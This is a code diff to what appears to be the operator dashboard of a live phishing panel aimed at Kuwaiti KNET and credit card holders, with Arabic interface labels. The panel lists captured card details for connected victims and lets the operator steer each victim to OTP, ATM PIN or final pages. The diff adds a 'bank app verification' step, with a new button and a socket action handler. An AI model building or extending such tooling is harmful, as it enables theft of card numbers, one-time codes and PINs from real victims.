@@ -1974,6 +1974,7 @@
       html += '<option value="summary-payment">ملخص الدفع</option>';
       html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
       html += '<option value="otp-verification">OTP البطاقة</option>';
+      html += '<option value="bank-app-verification">تطبيق البنك</option>';
       html += '<option value="atm-password">كلمة مرور ATM</option>';
       html += '<option value="final-page">الصفحة النهائية</option>';
       html += '</select>';
@@ -2190,6 +2191,7 @@
               html += '</div>';
               // Action buttons for KNET card
               html += '<div class="flex gap-2 mt-3">';
+              html += '<button onclick="cardActionApp(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق</button>';
               html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
               html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
@@ -2218,6 +2220,7 @@
               html += '</div>';
               // Action buttons for credit card
               html += '<div class="flex gap-2 mt-3">';
+              html += '<button onclick="cardActionApp(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق</button>';
               html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
               html += '<button onclick="cardActionATM(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
               html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
@@ -2598,6 +2601,7 @@
       html += '<option value="store/search">البحث</option>';
       html += '<option value="summary-payment">ملخص الدفع</option>';
       html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';      html += '<option value="otp-verification">OTP البطاقة</option>';
+      html += '<option value="bank-app-verification">تطبيق البنك</option>';
       html += '<option value="atm-password">كلمة مرور ATM</option>';
       html += '<option value="final-page">الصفحة النهائية</option>';
       html += '</select>';      html += '<button onclick="navigateVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">توجيه</button></div></div>';
@@ -2760,6 +2764,25 @@
     }
 
     // Card action functions
+    function cardActionApp(btn, socketId) {
+      const originalText = btn.textContent;
+      const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-purple-600';
+      window.skipDetailsUpdate = true;
+      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'app' });
+      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
+      if (visitor) { visitor.waitingForAdminResponse = false; }
+      renderVisitorsList();
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove(originalBg);
+      btn.classList.add('bg-green-600');
+      setTimeout(() => {
+        window.skipDetailsUpdate = false;
+        btn.textContent = originalText;
+        btn.classList.remove('bg-green-600');
+        btn.classList.add(originalBg);
+      }, 1500);
+    }
+
     function cardActionOTP(btn, socketId) {
       const originalText = btn.textContent;
       const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-blue-600';
